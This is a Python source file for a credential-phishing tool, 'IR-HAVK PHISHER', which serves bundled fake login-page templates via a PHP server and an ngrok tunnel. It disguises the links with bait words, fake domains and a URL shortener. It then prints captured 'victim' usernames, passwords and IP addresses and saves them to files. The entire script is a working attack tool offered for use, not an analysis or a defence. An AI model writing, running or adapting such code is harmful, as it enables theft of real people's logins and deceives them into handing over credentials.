# -*- coding: UTF-8 -*-
"""
IR-HAVK PHISHER - Self Contained Edition
All files loaded locally from src/ directory
"""

from os import popen, system, remove, name as os_name, getcwd, chdir
from os.path import isfile, exists, abspath, dirname, join
from sys import stdout, version_info
from socket import setdefaulttimeout, socket, AF_INET, SOCK_STREAM
from time import sleep
from re import sub
from json import loads
from argparse import ArgumentParser, BooleanOptionalAction
import platform

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="2.0"

ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Get script directory for local file references
SCRIPT_DIR = dirname(abspath(__file__))
SRC_DIR = join(SCRIPT_DIR, "src")
FILES_DIR = join(SCRIPT_DIR, "files")

logo=rf'''
{green}██╗██████╗       ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
{cyan} ██║██╔══██╗      ██║  ██║██╔══██╗██║   ██║██║ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
{cyan} ██║██████╔╝█████╗███████║███████║██║   ██║█████╔╝     ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
{cyan} ██║██╔══██╗╚════╝██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
{cyan} ██║██║  ██║      ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
{green}╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                            {cyan}[v{version}]
                                                            {red}[CREATED By ATHEX BLACK HAT]
'''
pkgs=[ "php", "curl", "wget", "unzip" ]
is_windows = os_name == 'nt'
is_linux = os_name == 'posix'
is_mac = platform.system() == 'Darwin'
try:
    if is_windows:
        test = popen("echo %USERPROFILE%")
        root = popen("echo %USERPROFILE%").read().strip()
    else:
        test = popen("cd $HOME && pwd")
        root = popen("cd $HOME && pwd").read().strip()
except:
    exit()
supported_version = 3
if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)
choice_file = join(FILES_DIR, "templates.json")
version_file = join(FILES_DIR, "version.txt")
changelog_file = join(FILES_DIR, "changelog.log")
websites_zip = join(SRC_DIR, "websites.zip")
ngrok_dir = join(SRC_DIR, "ngrok")
phishingsites_dir = join(SRC_DIR, "phishingsites")

# Check if required local files exist
def check_local_files():
    missing = []
    if not isfile(choice_file):
        missing.append(f"files/templates.json")
    if not isfile(version_file):
        missing.append(f"files/version.txt")
    if not isfile(websites_zip):
        missing.append(f"src/websites.zip")
    if not exists(ngrok_dir):
        missing.append(f"src/ngrok/")
    if not exists(phishingsites_dir):
        missing.append(f"src/phishingsites/")
    
    if missing:
        print(f"{error}Missing required files/directories:")
        for m in missing:
            print(f"  {red}✗ {m}{nc}")
        print(f"\n{info}Please ensure all files are in place:")
        print(f"  {yellow}├── files/")
        print(f"  │   ├── templates.json")
        print(f"  │   ├── version.txt")
        print(f"  │   └── changelog.log")
        print(f"  └── src/")
        print(f"      ├── websites.zip")
        print(f"      ├── ngrok/")
        print(f"      └── phishingsites/{nc}")
        exit(1)

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    
logo2=rf'''
{green}██╗██████╗       ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
{cyan} ██║██╔══██╗      ██║  ██║██╔══██╗██║   ██║██║ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
{cyan} ██║██████╔╝█████╗███████║███████║██║   ██║█████╔╝     ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
{cyan} ██║██╔══██╗╚════╝██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
{cyan} ██║██║  ██║      ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
{green}╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                            {cyan}[v{version}]
                                                            {red}[By ATHEX BLACK HAT]
'''

argparser = ArgumentParser()
argparser.add_argument("-p", "--port", type=int, default=8080, help="ir-havk_phisher server port [ Default : 8080 ]")
argparser.add_argument("-o", "--option", default="", help="ir-havk_phisher's template index [ Default : null ]")
argparser.add_argument("--update", help="Check for update", action=BooleanOptionalAction, default=False)  # Disabled by default for local version

args = argparser.parse_args()
port = args.port
option = args.option
update = args.update

local_url = f"127.0.0.1:{port}"

def sprint(n, t=0.05):
    for word in n + '\n':
        stdout.write(word)
        stdout.flush()
        sleep(t)
        
def internet(host="8.8.8.8", port=53, timeout=10):
    try:
        setdefaulttimeout(timeout)
        socket(AF_INET, SOCK_STREAM).connect((host, port))
    except:
        print(f"{error}No internet!")
        sleep(2)
        internet()
        
if logo.find("ATHEX BLACK HAT")==-1:
    print(f"{error}Replacing a logo doesn't make you a developer Lol!")
    exit(1)
        
def exception_handler(e, multiline=False, skip=True):
    lines_arr = []
    tb = e.__traceback__
    while tb is not None:
        if tb.tb_frame.f_code.co_filename == abspath(__file__):
            lines_arr.append(str(tb.tb_lineno))
        tb = tb.tb_next
    name = type(e).__name__
    if skip:
        if name == "ModuleNotFoundError" or name == "NameError":
            print(f"{error}Error!")
            return
    message = str(e).split(":")[0]
    line_no = lines_arr[len(lines_arr) - 1]
    lines_no = ", ".join(lines_arr)
    if multiline:
        print(f"{error}{name}: {message} at lines {lines_no}")
    else:
        print(f"{error}{name}: {message} at line {line_no}")

def is_json(myjson):
  try:
    loads(myjson)
    return True
  except ValueError:
    return False

def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)

def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")

def killer():
    if is_windows:
        system("taskkill /F /IM php.exe > nul 2>&1")
        system("taskkill /F /IM ngrok.exe > nul 2>&1")
        system("taskkill /F /IM cloudflared.exe > nul 2>&1")
        system("taskkill /F /IM curl.exe > nul 2>&1")
        system("taskkill /F /IM wget.exe > nul 2>&1")
        system("taskkill /F /IM unzip.exe > nul 2>&1")
    else:
        system("pkill -f 'php -S' 2>/dev/null")
        if system("pidof php > /dev/null 2>&1")==0:
            system("killall php 2>/dev/null")
        if system("pidof ngrok > /dev/null 2>&1")==0:
            system("killall ngrok 2>/dev/null")
        if system("pidof cloudflared > /dev/null 2>&1")==0:
            system("killall cloudflared 2>/dev/null")
        if system("pidof curl > /dev/null 2>&1")==0:
            system("killall curl 2>/dev/null")
        if system("pidof wget > /dev/null 2>&1")==0:
            system("killall wget 2>/dev/null")
        if system("pidof unzip > /dev/null 2>&1")==0:
            system("killall unzip 2>/dev/null")

def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()

def about():
    system("clear" if not is_windows else "cls")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[ir-havk_phisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[ATHEX BLACK HAT] ")
    print(f"{red}[Mode]      {cyan} :[LOCAL - No External Links] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()

def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            if is_windows:
                system(f'cd /d "{fol}" && del /f ip.txt usernames.txt 2>nul && xcopy /E /Y * "{root}\\.site\\"')
            else:
                system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()

# Update function - now checks local version only
def updater():
    print(f"{info}Running in LOCAL mode - updates disabled")
    print(f"{info2}Current version: {green}{version}{nc}")
    sleep(2)

def main():
    # Check local files first
    check_local_files()
    prerequiments()
    while True:
        if not isfile(choice_file):
            sprint(f"\n{error}templates.json not found in files/ directory!")
            sprint(f"{info}Please add templates.json to: {FILES_DIR}{nc}")
            exit(1)
        
        system("clear" if not is_windows else "cls")
        sprint(logo, 0.01)
        
        # Load templates from LOCAL file only
        with open(choice_file, "r") as choice_data:
            local_json = choice_data.read()
            if is_json(local_json):
                sites = loads(local_json)
            else:
                sprint(f"\n{error}Invalid JSON in templates.json!")
                sprint(f"{info}Please check the file format{nc}")
                exit(1)
            
            names = []
            choices = []
            masks = []
            folders = []
            for site in sites:
                names.append(site["name"])
                choices.append(site["choice"])
                folders.append(site["folder"])
                masks.append(site["mask"])
            show_options(names)
        
        if option!="":
            choice = option
        else:
            choice = input(f"{ask}Select one of the options > {nc}")
        if choice != "0" and choice.startswith("0"):
            choice = choice.replace("0", "")
        if choice in choices:
            index = choices.index(choice)
            folder = folders[index]
            mask = masks[index]
            if folder == "custom" and mask == "custom":
                customfol()
            requirements(folder, mask)
        elif choice == "x" or choice == "X":
            about()
        elif choice == "m" or choice == "M":
            sprint(f"\n{info}Running in LOCAL mode - no external links{nc}")
            main()
        elif choice == "0":
            pexit()
        else:
            sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
            main()

def prerequiments():
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
        installer("pkg")
    elif is_windows:
        print(f"{info}Checking requirements for Windows...{nc}")
        if system("where php > nul 2>&1") != 0:
            sprint(f"{error}PHP not found! Please install PHP and add to PATH{nc}")
            exit(1)
        if system("where curl > nul 2>&1") != 0:
            sprint(f"{error}Curl not found! Please install curl and add to PATH{nc}")
            exit(1)
        if system("where wget > nul 2>&1") != 0:
            sprint(f"{info}Wget not found. Will use curl as alternative{nc}")
        if system("where unzip > nul 2>&1") != 0:
            if system("where tar > nul 2>&1") != 0:
                sprint(f"{error}Unzip/tar not found! Please install unzip and add to PATH{nc}")
                exit(1)
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"\n{error}PHP is not installed! Installing PHP...{nc}")
        if sudo and apt:
            system("sudo apt update && sudo apt install -y php-cli php")
        elif sudo and aptget:
            system("sudo apt-get update && sudo apt-get install -y php-cli php")
        else:
            sprint(f"{error}Cannot install PHP automatically. Please install PHP manually:\n{info}sudo apt install php-cli{nc}")
            exit(1)
    
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP installation failed! Please install PHP manually{nc}")
        exit(1)
    else:
        sprint(f"\n{success}PHP is installed: {green}" + popen("php -v 2>&1 | head -n1").read().strip() + f"{nc}")
    
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(f"{error}Unzip not found. Install it manually!{nc}")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(f"{error}Curl not found. Install it manually!{nc}")
        exit(1)
    
    killer()
    
    if is_windows:
        system(f"if not exist \"{root}\\.ngrokfolder\" mkdir \"{root}\\.ngrokfolder\"")
        system(f"if not exist \"{root}\\.cffolder\" mkdir \"{root}\\.cffolder\"")
        system(f"rmdir /S /Q \"{root}\\.site\" 2>nul & mkdir \"{root}\\.site\"")
    else:
        # ====== NGROK SETUP FROM LOCAL SRC ======
        if not isfile(f"{root}/.ngrokfolder/ngrok"):
            sprint(f"\n{info}Setting up ngrok from local files...{nc}")
            
            x=popen("uname -m").read().strip()
            y=popen("uname").read().strip()
            
            # Determine which ngrok binary to use
            ngrok_file = None
            extract_cmd = None
            
            if y.find("Linux")!=-1:
                if x.find("aarch64")!=-1 or x.find("arm64")!=-1:
                    ngrok_file = join(ngrok_dir, "ngrok-stable-linux-arm64.tgz")
                    extract_cmd = "tar -zxf"
                elif x.find("arm")!=-1:
                    ngrok_file = join(ngrok_dir, "ngrok-stable-linux-arm.zip")
                    extract_cmd = "unzip"
                elif x.find("x86_64")!=-1:
                    ngrok_file = join(ngrok_dir, "ngrok-stable-linux-amd64.zip")
                    extract_cmd = "unzip"
                else:
                    ngrok_file = join(ngrok_dir, "ngrok-stable-linux-386.zip")
                    extract_cmd = "unzip"
            elif y.find("Darwin")!=-1:
                if x.find("x86_64")!=-1:
                    ngrok_file = join(ngrok_dir, "ngrok-stable-darwin-amd64.zip")
                    extract_cmd = "unzip"
                elif x.find("arm64")!=-1:
                    ngrok_file = join(ngrok_dir, "ngrok-stable-arm64.zip")
                    extract_cmd = "unzip"
            
            if ngrok_file and isfile(ngrok_file):
                sprint(f"{info}Extracting ngrok from: {yellow}{ngrok_file}{nc}")
                
                # Copy to home directory and extract
                if ngrok_file.endswith(".tgz"):
                    system(f"cp '{ngrok_file}' /tmp/ngrok.tgz && cd /tmp && tar -zxf ngrok.tgz && rm ngrok.tgz")
                else:
                    system(f"cp '{ngrok_file}' /tmp/ngrok.zip && cd /tmp && unzip -o ngrok.zip && rm ngrok.zip")
                
                system("mkdir -p $HOME/.ngrokfolder")
                system("mv -f /tmp/ngrok $HOME/.ngrokfolder/ 2>/dev/null")
                
                if sudo:
                    system("sudo chmod +x $HOME/.ngrokfolder/ngrok 2>/dev/null")
                else:
                    system("chmod +x $HOME/.ngrokfolder/ngrok 2>/dev/null")
                
                sprint(f"{success}Ngrok installed successfully!{nc}")
            else:
                sprint(f"{error}Ngrok binary not found in src/ngrok/")
                sprint(f"{info}Expected location: {ngrok_dir}")
                sprint(f"{info}Architecture: {x} | OS: {y}{nc}")
                sprint(f"{info}Continuing without ngrok...{nc}")
        
        # ====== CLOUDFLARED SETUP ======
        # Cloudflared still needs internet (optional)
        if not isfile(f"{root}/.cffolder/cloudflared"):
            sprint(f"\n{info}Cloudflared not found. Skipping...{nc}")
            sprint(f"{info}You can still use ngrok or localhost{nc}")
        
        if system("pidof php > /dev/null 2>&1")==0:
            sprint(f"{error}Previous php still running! Killing it...{nc}")
            system("pkill -f 'php -S'")
            sleep(1)
        if system("pidof ngrok > /dev/null 2>&1")==0:
            sprint(f"{error}Previous ngrok still running. Killing it...{nc}")
            system("killall ngrok")
            sleep(1)
        
        system("rm -rf $HOME/.site && mkdir -p $HOME/.site")

def requirements(folder, mask):
    # Use local websites.zip
    if isfile(websites_zip):
        sprint(f"\n{info}Extracting websites from local: {yellow}src/websites.zip{nc}")
    else:
        sprint(f"\n{error}websites.zip not found at: {websites_zip}")
        sprint(f"{info}Please add websites.zip to src/ directory{nc}")
        exit(1)
    
    # Extract websites.zip
    if is_windows:
        system(f"rmdir /S /Q \"{root}\\.websites\" 2>nul & mkdir \"{root}\\.websites\"")
    else:
        system(f"rm -rf $HOME/.websites && mkdir -p $HOME/.websites")
    
    system(f"unzip -o \"{websites_zip}\" -d {root}/.websites > /dev/null 2>&1")
    sprint(f"{success}Websites extracted successfully!{nc}")
    
    # Check if the requested folder exists
    if exists(f"{root}/.websites/{folder}"):
        if is_windows:
            system(f"xcopy /E /Y \"{root}\\.websites\\{folder}\\*\" \"{root}\\.site\\\"")
        else:
            system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site/")
    else:
        # Try to find the zip in local phishingsites directory
        site_zip = join(phishingsites_dir, f"{folder}.zip")
        
        if isfile(site_zip):
            sprint(f"\n{info}Extracting {folder} from local: {yellow}src/phishingsites/{folder}.zip{nc}")
            
            if not exists(f"{root}/.websites/{folder}"):
                if is_windows:
                    system(f"mkdir \"{root}\\.websites\\{folder}\"")
                else:
                    system(f"mkdir -p $HOME/.websites/{folder}")
            
            system(f"unzip -o \"{site_zip}\" -d {root}/.websites/{folder} > /dev/null 2>&1")
            
            if is_windows:
                system(f"xcopy /E /Y \"{root}\\.websites\\{folder}\\*\" \"{root}\\.site\\\"")
            else:
                system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site/")
        else:
            sprint(f"\n{error}Template '{folder}' not found!")
            sprint(f"{info}Looking for: {site_zip}")
            sprint(f"{info}Available templates in src/phishingsites/:")
            if exists(phishingsites_dir):
                system(f"ls {phishingsites_dir}/ 2>/dev/null || dir \"{phishingsites_dir}\" 2>nul")
            pexit()
    
    server(mask)

def server(mask):
    system("clear" if not is_windows else "cls")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    
    if is_windows:
        site_path = f"{root}\\.site"
    else:
        site_path = f"{root}/.site"
    
    if not exists(site_path):
        sprint(f"\n{error}Site directory not found at {site_path}")
        system(f"mkdir -p {site_path}")
    
    if not isfile(f"{site_path}/index.php"):
        sprint(f"\n{error}index.php not found in {site_path}")
        sprint(f"{info}This might cause PHP server to fail{nc}")
    
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    
    if is_windows:
        system(f"cd /d \"{site_path}\" && start /B php -S {local_url} > nul 2>&1")
    else:
        system("pkill -f 'php -S' 2>/dev/null")
        sleep(1)
        system(f"cd {site_path} && php -S {local_url} > /dev/null 2>&1 &")
        sleep(3)
    
    sprint(f"\n{info}Checking if PHP server started...{nc}")
    max_retries = 3
    server_started = False
    
    for retry in range(max_retries):
        if is_windows:
            check_server = system(f"curl --output nul --silent --head --fail {local_url} 2>nul")
        else:
            check_server = system(f"curl --output /dev/null --silent --head --fail {local_url}")
        
        if check_server == 0:
            server_started = True
            break
        else:
            sprint(f"{info}Waiting for server... (attempt {retry+1}/{max_retries}){nc}")
            sleep(2)
    
    if server_started:
        sprint(f"\n{success}PHP Server started on port {port}!{nc}")
    else:
        sprint(f"\n{error}PHP Server failed to start!")
        sprint(f"{info}Try: {yellow}php -S {local_url} -t {site_path}{nc}")
        pexit()
    
    sprint(f"\n{info2}Initializing tunnelers...{nc}")
    
    if is_windows:
        system(f"del /f \"{root}\\.cffolder\\log.txt\" 2>nul")
        system(f"start /B ngrok http {local_url} > nul 2>&1")
    else:
        system("rm -rf $HOME/.cffolder/log.txt")
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        else:
            system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
    
    sprint(f"\n{info}Waiting for tunnelers to initialize... (10 seconds){nc}")
    sleep(10)
    
    # Get ngrok URL
    if is_windows:
        ngrok_cmd = 'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\\.ngrok\\.io"'
        ngrok_link = popen(ngrok_cmd).read()
    else:
        ngrok_link = popen('curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o \'https://[-0-9a-z]*\\.ngrok\\.io\'').read()
    
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
        sprint(f"{success}Ngrok tunnel active!{nc}")
    else:
        ngrok_check=False
        sprint(f"{info}Ngrok tunnel not detected (may still be starting){nc}")
    
    cf_check=False
    
    if ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    else:
        sprint(f"\n{info}Your local URL: {yellow}http://{local_url}")
        sprint(f"{info}Use this for local testing or port forward manually{nc}")
        waiter()

def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your URLs are ready:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")

def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

def masking(url):
    website = "https://is.gd/create.php?format=simple&url=" + url.strip()
    internet()
    resp = popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}URL shortening service not available!")
        waiter()
    short = resp.replace("https://", "")
    domain = input(f"\n{ask}Enter custom domain(Example: google.com) > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain = "https://" + domain + "-"
    bait = input(f"\n{ask}Enter bait words (Example: free-money) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait) + "@"
    final = domain + bait + short
    sprint(f"\n{success}Your custom URL: {bgreen}{final}")
    waiter()

def waiter():
    if is_windows:
        system(f"del /f \"{root}\\.site\\ip.txt\" 2>nul")
    else:
        system("rm -f $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info...{cyan}Press {red}Ctrl+C{cyan} to exit{nc}")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next...{cyan}Press {red}Ctrl+C{cyan} to exit{nc}")
                if is_windows:
                    system(f"type \"{root}\\.site\\usernames.txt\" >> usernames.txt")
                else:
                    system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                if is_windows:
                    system(f"type \"{root}\\.site\\ip.txt\" >> ip.txt")
                else:
                    system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -f $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        if not is_windows:
            system("stty -echoctl 2>/dev/null") 
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()